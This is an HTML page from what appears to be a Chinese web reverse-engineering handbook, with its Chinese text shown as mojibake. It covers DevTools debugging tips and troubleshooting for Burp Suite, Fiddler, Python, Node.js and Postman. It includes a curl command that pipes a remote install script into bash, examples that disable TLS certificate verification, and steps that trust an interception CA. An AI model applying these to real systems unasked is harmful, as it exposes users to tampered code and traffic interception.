<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">_constructor</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="p">};</span>
</code></pre>
      </div>

      <hr />

      <h2 id="è°ƒè¯•æŠ€å·§æ€»ç»“">è°ƒè¯•æŠ€å·§æ€»ç»“</h2>

      <h3 id="1-å¿«æ·é”®">1. å¿«æ·é”®</h3>

      <table>
        <thead>
          <tr>
            <th>æ“ä½œ</th>
            <th>Windows/Linux</th>
            <th>Mac</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>æ‰“å¼€ DevTools</td>
            <td>F12</td>
            <td>Cmd + Opt + I</td>
          </tr>
          <tr>
            <td>æ‰“å¼€æ§åˆ¶å°</td>
            <td>Ctrl + Shift + J</td>
            <td>Cmd + Opt + J</td>
          </tr>
          <tr>
            <td>ä¸‹ä¸€æ­¥</td>
            <td>F10</td>
            <td>F10</td>
          </tr>
          <tr>
            <td>è¿›å…¥å‡½æ•°</td>
            <td>F11</td>
            <td>F11</td>
          </tr>
          <tr>
            <td>è·³å‡ºå‡½æ•°</td>
            <td>Shift + F11</td>
            <td>Shift + F11</td>
          </tr>
          <tr>
            <td>ç»§ç»­æ‰§è¡Œ</td>
            <td>F8</td>
            <td>F8</td>
          </tr>
          <tr>
            <td>ç¦ç”¨æ–­ç‚¹</td>
            <td>Ctrl + F8</td>
            <td>Cmd + F8</td>
          </tr>
        </tbody>
      </table>

      <h3 id="2-console-api">2. Console API</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åˆ†ç»„æ—¥å¿—</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">group</span><span class="p">(</span><span class="s1">&#39;Group 1&#39;</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;message 1&#39;</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;message 2&#39;</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">groupEnd</span><span class="p">();</span>

<span class="c1">// è¡¨æ ¼æ˜¾ç¤º</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">table</span><span class="p">([{</span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">},</span><span class="w"> </span><span class="p">{</span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;b&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">2</span><span class="p">}]);</span>

<span class="c1">// è®¡æ—¶</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">time</span><span class="p">(</span><span class="s1">&#39;operation&#39;</span><span class="p">);</span>
<span class="c1">// ... æ“ä½œ</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">timeEnd</span><span class="p">(</span><span class="s1">&#39;operation&#39;</span><span class="p">);</span>

<span class="c1">// è®¡æ•°</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">count</span><span class="p">(</span><span class="s1">&#39;counter&#39;</span><span class="p">);</span><span class="w">  </span><span class="c1">// counter: 1</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">count</span><span class="p">(</span><span class="s1">&#39;counter&#39;</span><span class="p">);</span><span class="w">  </span><span class="c1">// counter: 2</span>

<span class="c1">// æ–­è¨€</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">assert</span><span class="p">(</span><span class="mf">1</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Should not happen&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="3-performance-è°ƒè¯•">3. Performance è°ƒè¯•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ€§èƒ½æ ‡è®°</span>
<span class="nx">performance</span><span class="p">.</span><span class="nx">mark</span><span class="p">(</span><span class="s1">&#39;start&#39;</span><span class="p">);</span>
<span class="c1">// ... æ“ä½œ</span>
<span class="nx">performance</span><span class="p">.</span><span class="nx">mark</span><span class="p">(</span><span class="s1">&#39;end&#39;</span><span class="p">);</span>
<span class="nx">performance</span><span class="p">.</span><span class="nx">measure</span><span class="p">(</span><span class="s1">&#39;operation&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;start&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;end&#39;</span><span class="p">);</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">performance</span><span class="p">.</span><span class="nx">getEntriesByType</span><span class="p">(</span><span class="s1">&#39;measure&#39;</span><span class="p">));</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ğŸ“š ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#03-Basic-Recipes-debugging-techniques">è°ƒè¯•æŠ€å·§</a></li>
        <li><a href="#03-Basic-Recipes-hooking-techniques">Hook æŠ€å·§</a></li>
        <li><a href="#04-Advanced-Recipes-javascript-deobfuscation">JavaScript åæ··æ·†</a></li>
        <li><a href="#02-Tooling-browser-devtools">æµè§ˆå™¨ DevTools</a></li>
      </ul>

    </div>

    <div class="section" id="10-Troubleshooting-tool-issues">
      <h2>78. Tool Issues</h2>
      <h1 id="å·¥å…·ä½¿ç”¨é—®é¢˜">å·¥å…·ä½¿ç”¨é—®é¢˜</h1>

      <p>å¸¸è§å¼€å‘å’Œé€†å‘å·¥å…·çš„é—®é¢˜åŠè§£å†³æ–¹æ¡ˆã€‚</p>

      <hr />

      <h2 id="chrome-devtools-é—®é¢˜">Chrome DevTools é—®é¢˜</h2>

      <h3 id="æ— æ³•æ‰“å¼€-devtools">æ— æ³•æ‰“å¼€ DevTools</h3>

      <p><strong>é—®é¢˜</strong>: æŒ‰ F12 æˆ–å³é”®æ£€æŸ¥æ— ååº”</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// 1. æ£€æŸ¥æ˜¯å¦è¢«ç¦ç”¨</span>
<span class="c1">// æŸäº›ç½‘ç«™ä¼šç¦ç”¨å³é”®èœå•å’Œå¿«æ·é”®</span>

<span class="c1">// ç»•è¿‡æ–¹æ³• 1: åœ¨åœ°å€æ è¾“å…¥</span>
<span class="nx">chrome</span><span class="o">:</span><span class="c1">//inspect</span>

<span class="c1">// ç»•è¿‡æ–¹æ³• 2: ä»èœå•æ‰“å¼€</span>
<span class="c1">// Chrome â†’ æ›´å¤šå·¥å…· â†’ å¼€å‘è€…å·¥å…·</span>

<span class="c1">// ç»•è¿‡æ–¹æ³• 3: ä½¿ç”¨å¿«æ·é”®ç»„åˆ</span>
<span class="nx">Ctrl</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">Shift</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">I</span><span class="w">  </span><span class="p">(</span><span class="nx">Windows</span><span class="o">/</span><span class="nx">Linux</span><span class="p">)</span>
<span class="nx">Cmd</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">Option</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">I</span><span class="w">   </span><span class="p">(</span><span class="nx">Mac</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="devtools-æ˜¾ç¤ºå¼‚å¸¸">DevTools æ˜¾ç¤ºå¼‚å¸¸</h3>

      <p><strong>é—®é¢˜</strong>: DevTools ç•Œé¢æ··ä¹±ã€å¡é¡¿æˆ–å´©æºƒ</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. é‡ç½® DevTools è®¾ç½®</span>
<span class="c1"># æ‰“å¼€ DevTools â†’ Settings (F1) â†’ Restore defaults</span>

<span class="c1"># 2. æ¸…é™¤ DevTools ç¼“å­˜</span>
<span class="c1"># Settings â†’ Preferences â†’ Network â†’ Disable cache (while DevTools is open)</span>

<span class="c1"># 3. ç¦ç”¨æ‰©å±•</span>
<span class="c1"># åœ¨éšèº«æ¨¡å¼æ‰“å¼€ (Ctrl + Shift + N)</span>

<span class="c1"># 4. å®Œå…¨é‡ç½® Chrome</span>
<span class="c1"># åˆ é™¤ç”¨æˆ·æ•°æ®ç›®å½•</span>
<span class="c1"># Windows: %LOCALAPPDATA%\Google\Chrome\User Data</span>
<span class="c1"># Mac: ~/Library/Application Support/Google/Chrome</span>
<span class="c1"># Linux: ~/.config/google-chrome</span>
</code></pre>
      </div>

      <h3 id="network-é¢æ¿æ— æ³•æŠ“åŒ…">Network é¢æ¿æ— æ³•æŠ“åŒ…</h3>

      <p><strong>é—®é¢˜</strong>: Network æ ‡ç­¾é¡µä¸­çœ‹ä¸åˆ°è¯·æ±‚</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <ol>
        <li><strong>æ£€æŸ¥è¿‡æ»¤å™¨</strong></li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Network é¢æ¿ä¸­ï¼Œç¡®ä¿:</span>
<span class="c1">// - æœªå‹¾é€‰ &quot;Hide data URLs&quot;</span>
<span class="c1">// - Filter è¾“å…¥æ¡†ä¸ºç©º</span>
<span class="c1">// - All ç±»å‹å·²é€‰ä¸­</span>
</code></pre>
      </div>

      <ol start="2">
        <li><strong>å¯ç”¨æ—¥å¿—ä¿ç•™</strong></li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Network â†’ å‹¾é€‰ &quot;Preserve log&quot;</span>
<span class="c1">// è¿™æ ·é¡µé¢è·³è½¬åä»èƒ½çœ‹åˆ°ä¹‹å‰çš„è¯·æ±‚</span>
</code></pre>
      </div>

      <ol start="3">
        <li><strong>æ¸…é™¤ç¼“å­˜</strong></li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// å³é”®åˆ·æ–°æŒ‰é’® â†’ &quot;Empty Cache and Hard Reload&quot;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="burp-suite-é…ç½®é—®é¢˜">Burp Suite é…ç½®é—®é¢˜</h2>

      <h3 id="ä»£ç†é…ç½®ä¸ç”Ÿæ•ˆ">ä»£ç†é…ç½®ä¸ç”Ÿæ•ˆ</h3>

      <p><strong>é—®é¢˜</strong>: è®¾ç½®ä»£ç†åæµè§ˆå™¨æ— æ³•è®¿é—®ç½‘ç«™</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <h4 id="1-æ£€æŸ¥ä»£ç†è®¾ç½®">1. æ£€æŸ¥ä»£ç†è®¾ç½®</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># Burp Suite é»˜è®¤ä»£ç†</span>
<span class="m">127</span>.0.0.1:8080

<span class="c1"># æµè§ˆå™¨ä»£ç†è®¾ç½® (Chrome)</span>
chrome://settings/system
<span class="c1"># æˆ–ä½¿ç”¨ SwitchyOmega æ‰©å±•</span>
</code></pre>
      </div>

      <h4 id="2-æ£€æŸ¥-burp-ç›‘å¬å™¨">2. æ£€æŸ¥ Burp ç›‘å¬å™¨</h4>

      <pre><code>Proxy â†’ Options â†’ Proxy Listeners
ç¡®ä¿:
- Running: å‹¾é€‰
- Interface: 127.0.0.1:8080
- Support invisible proxying: å‹¾é€‰ (å¦‚éœ€è¦)
</code></pre>

      <h4 id="3-é˜²ç«å¢™è®¾ç½®">3. é˜²ç«å¢™è®¾ç½®</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># Windows é˜²ç«å¢™å¯èƒ½é˜»æ­¢æœ¬åœ°ç«¯å£</span>
<span class="c1"># æ·»åŠ å…¥ç«™è§„åˆ™å…è®¸ 8080 ç«¯å£</span>

<span class="c1"># Linux</span>
sudo<span class="w"> </span>ufw<span class="w"> </span>allow<span class="w"> </span><span class="m">8080</span>
</code></pre>
      </div>

      <h3 id="ssl-è¯ä¹¦é—®é¢˜">SSL è¯ä¹¦é—®é¢˜</h3>

      <p><strong>é—®é¢˜</strong>: HTTPS ç½‘ç«™æ˜¾ç¤ºè¯ä¹¦é”™è¯¯</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <h4 id="1-å¯¼å…¥-burp-ca-è¯ä¹¦">1. å¯¼å…¥ Burp CA è¯ä¹¦</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. å¯¼å‡ºè¯ä¹¦</span>
<span class="c1"># Proxy â†’ Options â†’ Import/Export CA certificate</span>
<span class="c1"># å¯¼å‡ºä¸º DER æ ¼å¼</span>

<span class="c1"># 2. å®‰è£…åˆ°ç³»ç»Ÿ</span>
<span class="c1"># Windows: åŒå‡» .cer æ–‡ä»¶ â†’ å®‰è£…åˆ°&quot;å—ä¿¡ä»»çš„æ ¹è¯ä¹¦é¢å‘æœºæ„&quot;</span>
<span class="c1"># Mac: åŒå‡» â†’ æ·»åŠ åˆ°é’¥åŒ™ä¸² â†’ è®¾ç½®ä¸º&quot;å§‹ç»ˆä¿¡ä»»&quot;</span>
<span class="c1"># Linux: sudo cp cacert.der /usr/local/share/ca-certificates/burp.crt</span>
<span class="c1">#        sudo update-ca-certificates</span>
</code></pre>
      </div>

      <h4 id="2-firefox-ç‰¹æ®Šé…ç½®">2. Firefox ç‰¹æ®Šé…ç½®</h4>

      <pre><code>Firefox ä½¿ç”¨ç‹¬ç«‹è¯ä¹¦å­˜å‚¨

1. æ‰“å¼€ Firefox â†’ Settings â†’ Privacy &amp; Security
2. Certificates â†’ View Certificates â†’ Import
3. å¯¼å…¥ Burp CA è¯ä¹¦
4. å‹¾é€‰ "Trust this CA to identify websites"
</code></pre>

      <h3 id="burp-æ‹¦æˆªå¤ªå¤šè¯·æ±‚">Burp æ‹¦æˆªå¤ªå¤šè¯·æ±‚</h3>

      <p><strong>é—®é¢˜</strong>: Proxy intercept æ‹¦æˆªäº†è¿‡å¤šæ— å…³è¯·æ±‚</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <pre><code># é…ç½®æ‹¦æˆªè§„åˆ™
Proxy â†’ Options â†’ Intercept Client Requests

# æ·»åŠ è§„åˆ™,åªæ‹¦æˆªç›®æ ‡åŸŸå
And URL Is in target scope

# æˆ–æ·»åŠ ç™½åå•
And URL matches: ^https://target\.com/.*
</code></pre>

      <hr />

      <h2 id="fiddler-é—®é¢˜">Fiddler é—®é¢˜</h2>

      <h3 id="æ— æ³•æ•è·-https-æµé‡">æ— æ³•æ•è· HTTPS æµé‡</h3>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <pre><code>1. Tools â†’ Options â†’ HTTPS
2. å‹¾é€‰ "Capture HTTPS CONNECTs"
3. å‹¾é€‰ "Decrypt HTTPS traffic"
4. ç‚¹å‡» "Actions" â†’ "Trust Root Certificate"
5. é‡å¯ Fiddler
</code></pre>

      <h3 id="ä»£ç†å†²çª">ä»£ç†å†²çª</h3>

      <p><strong>é—®é¢˜</strong>: ä¸å…¶ä»–ä»£ç†å·¥å…·å†²çª</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. æ£€æŸ¥ç³»ç»Ÿä»£ç†</span>
netsh<span class="w"> </span>winhttp<span class="w"> </span>show<span class="w"> </span>proxy<span class="w">  </span><span class="c1"># Windows</span>

<span class="c1"># 2. é‡ç½®ç³»ç»Ÿä»£ç†</span>
netsh<span class="w"> </span>winhttp<span class="w"> </span>reset<span class="w"> </span>proxy

<span class="c1"># 3. å…³é—­å…¶ä»–ä»£ç†å·¥å…·</span>
<span class="c1"># å¦‚ Charles, Burp, Proxifier ç­‰</span>
</code></pre>
      </div>

      <hr />

      <h2 id="python-ç¯å¢ƒé—®é¢˜">Python ç¯å¢ƒé—®é¢˜</h2>

      <h3 id="modulenotfounderror">ModuleNotFoundError</h3>

      <p><strong>é—®é¢˜</strong>: <code>ModuleNotFoundError: No module named 'xxx'</code></p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. æ£€æŸ¥æ˜¯å¦å®‰è£…</span>
pip<span class="w"> </span>list<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>xxx

<span class="c1"># 2. å®‰è£…æ¨¡å—</span>
pip<span class="w"> </span>install<span class="w"> </span>xxx

<span class="c1"># 3. æ£€æŸ¥ Python ç‰ˆæœ¬</span>
python<span class="w"> </span>--version
pip<span class="w"> </span>--version

<span class="c1"># 4. å¦‚æœæœ‰å¤šä¸ª Python ç‰ˆæœ¬</span>
python3<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>xxx

<span class="c1"># 5. ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ</span>
python<span class="w"> </span>-m<span class="w"> </span>venv<span class="w"> </span>venv
<span class="nb">source</span><span class="w"> </span>venv/bin/activate<span class="w">  </span><span class="c1"># Linux/Mac</span>
venv<span class="se">\S</span>cripts<span class="se">\a</span>ctivate<span class="w">     </span><span class="c1"># Windows</span>
pip<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt
</code></pre>
      </div>

      <h3 id="ssl-è¯ä¹¦éªŒè¯å¤±è´¥">SSL è¯ä¹¦éªŒè¯å¤±è´¥</h3>

      <p><strong>é—®é¢˜</strong>: <code>SSLError: [SSL: CERTIFICATE_VERIFY_FAILED]</code></p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æ–¹æ³• 1: å‡çº§ certifi</span>
<span class="n">pip</span> <span class="n">install</span> <span class="o">--</span><span class="n">upgrade</span> <span class="n">certifi</span>

<span class="c1"># æ–¹æ³• 2: åœ¨ä»£ç ä¸­ç¦ç”¨éªŒè¯ (ä¸æ¨èç”¨äºç”Ÿäº§ç¯å¢ƒ)</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>

<span class="c1"># æ–¹æ³• 3: æŒ‡å®šè¯ä¹¦è·¯å¾„</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">certifi</span>
<span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="n">certifi</span><span class="o">.</span><span class="n">where</span><span class="p">())</span>

<span class="c1"># æ–¹æ³• 4: è®¾ç½®ç¯å¢ƒå˜é‡</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;REQUESTS_CA_BUNDLE&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;/path/to/ca-bundle.crt&#39;</span>
</code></pre>
      </div>

      <h3 id="ç¼–ç é—®é¢˜">ç¼–ç é—®é¢˜</h3>

      <p><strong>é—®é¢˜</strong>: <code>UnicodeDecodeError</code> æˆ– <code>UnicodeEncodeError</code></p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è¯»å–æ–‡ä»¶æ—¶æŒ‡å®šç¼–ç </span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;file.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="c1"># å†™å…¥æ–‡ä»¶æ—¶æŒ‡å®šç¼–ç </span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;file.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>

<span class="c1"># å¤„ç†ç½‘ç»œå“åº”</span>
<span class="n">response</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;utf-8&#39;</span>
<span class="n">text</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>

<span class="c1"># æˆ–ä½¿ç”¨ chardet è‡ªåŠ¨æ£€æµ‹</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">chardet</span>
<span class="n">encoding</span> <span class="o">=</span> <span class="n">chardet</span><span class="o">.</span><span class="n">detect</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">)[</span><span class="s1">&#39;encoding&#39;</span><span class="p">]</span>
<span class="n">text</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">encoding</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="nodejs-é—®é¢˜">Node.js é—®é¢˜</h2>

      <h3 id="npm-å®‰è£…å¤±è´¥">npm å®‰è£…å¤±è´¥</h3>

      <p><strong>é—®é¢˜</strong>: <code>npm ERR! code EACCES</code> æˆ–ä¸‹è½½è¶…æ—¶</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. æƒé™é—®é¢˜ (Linux/Mac)</span>
sudo<span class="w"> </span>chown<span class="w"> </span>-R<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>~/.npm
sudo<span class="w"> </span>chown<span class="w"> </span>-R<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>/usr/local/lib/node_modules

<span class="c1"># 2. ä½¿ç”¨æ·˜å®é•œåƒ</span>
npm<span class="w"> </span>config<span class="w"> </span><span class="nb">set</span><span class="w"> </span>registry<span class="w"> </span>https://registry.npmmirror.com

<span class="c1"># 3. æ¸…é™¤ç¼“å­˜</span>
npm<span class="w"> </span>cache<span class="w"> </span>clean<span class="w"> </span>--force

<span class="c1"># 4. åˆ é™¤ node_modules é‡æ–°å®‰è£…</span>
rm<span class="w"> </span>-rf<span class="w"> </span>node_modules<span class="w"> </span>package-lock.json
npm<span class="w"> </span>install

<span class="c1"># 5. ä½¿ç”¨ cnpm</span>
npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>cnpm<span class="w"> </span>--registry<span class="o">=</span>https://registry.npmmirror.com
cnpm<span class="w"> </span>install
</code></pre>
      </div>

      <h3 id="node-ç‰ˆæœ¬é—®é¢˜">Node ç‰ˆæœ¬é—®é¢˜</h3>

      <p><strong>é—®é¢˜</strong>: é¡¹ç›®éœ€è¦ç‰¹å®š Node ç‰ˆæœ¬</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä½¿ç”¨ nvm ç®¡ç†å¤šç‰ˆæœ¬</span>
<span class="c1"># å®‰è£… nvm</span>
curl<span class="w"> </span>-o-<span class="w"> </span>https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>bash

<span class="c1"># å®‰è£…ç‰¹å®šç‰ˆæœ¬</span>
nvm<span class="w"> </span>install<span class="w"> </span><span class="m">18</span>.17.0
nvm<span class="w"> </span>use<span class="w"> </span><span class="m">18</span>.17.0

<span class="c1"># è®¾ç½®é»˜è®¤ç‰ˆæœ¬</span>
nvm<span class="w"> </span><span class="nb">alias</span><span class="w"> </span>default<span class="w"> </span><span class="m">18</span>.17.0

<span class="c1"># æˆ–ä½¿ç”¨ n</span>
npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>n
n<span class="w"> </span><span class="m">18</span>.17.0
</code></pre>
      </div>

      <hr />

      <h2 id="postman-é—®é¢˜">Postman é—®é¢˜</h2>

      <h3 id="è„šæœ¬æ‰§è¡Œé”™è¯¯">è„šæœ¬æ‰§è¡Œé”™è¯¯</h3>

      <p><strong>é—®é¢˜</strong>: Pre-request Script æˆ– Tests è„šæœ¬æŠ¥é”™</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// 1. æ£€æŸ¥è¯­æ³•</span>
<span class="c1">// Postman ä½¿ç”¨å—é™çš„ JavaScript ç¯å¢ƒ</span>

<span class="c1">// 2. å¸¸ç”¨åŠŸèƒ½ç¤ºä¾‹</span>

<span class="c1">// è®¾ç½®ç¯å¢ƒå˜é‡</span>
<span class="nx">pm</span><span class="p">.</span><span class="nx">environment</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s2">&quot;token&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">jsonData</span><span class="p">.</span><span class="nx">token</span><span class="p">);</span>

<span class="c1">// å‘é€è¯·æ±‚</span>
<span class="nx">pm</span><span class="p">.</span><span class="nx">sendRequest</span><span class="p">(</span><span class="s2">&quot;https://api.example.com/data&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="c1">// ä½¿ç”¨ CryptoJS</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">encrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">(</span><span class="s2">&quot;message&quot;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>

<span class="c1">// ä½¿ç”¨ moment.js</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">now</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">moment</span><span class="p">().</span><span class="nx">format</span><span class="p">();</span>
</code></pre>
      </div>

      <h3 id="è¯·æ±‚å¤±è´¥">è¯·æ±‚å¤±è´¥</h3>

      <p><strong>é—®é¢˜</strong>: è¯·æ±‚è¿”å›é”™è¯¯</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// 1. æ£€æŸ¥ä»£ç†è®¾ç½®</span>
<span class="nx">Settings</span><span class="w"> </span><span class="err">â†’</span><span class="w"> </span><span class="nb">Proxy</span><span class="w"> </span><span class="err">â†’</span><span class="w"> </span><span class="nx">å…³é—­</span><span class="w"> </span><span class="s2">&quot;Use the system proxy&quot;</span>

<span class="c1">// 2. ç¦ç”¨ SSL éªŒè¯ (ä»…æµ‹è¯•ç¯å¢ƒ)</span>
<span class="nx">Settings</span><span class="w"> </span><span class="err">â†’</span><span class="w"> </span><span class="nx">General</span><span class="w"> </span><span class="err">â†’</span><span class="w"> </span><span class="nx">å…³é—­</span><span class="w"> </span><span class="s2">&quot;SSL certificate verification&quot;</span>

<span class="c1">// 3. æ·»åŠ è¯¦ç»†æ—¥å¿—</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Request:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">pm</span><span class="p">.</span><span class="nx">request</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Response:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">pm</span><span class="p">.</span><span class="nx">response</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="vs-code-é—®é¢˜">VS Code é—®é¢˜</h2>

      <h3 id="python-intellisense-ä¸å·¥ä½œ">Python IntelliSense ä¸å·¥ä½œ</h3>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// settings.json</span>
<span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;python.defaultInterpreterPath&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/path/to/python&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;python.analysis.typeCheckingMode&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;basic&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;python.analysis.autoImportCompletions&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
<span class="p">}</span>
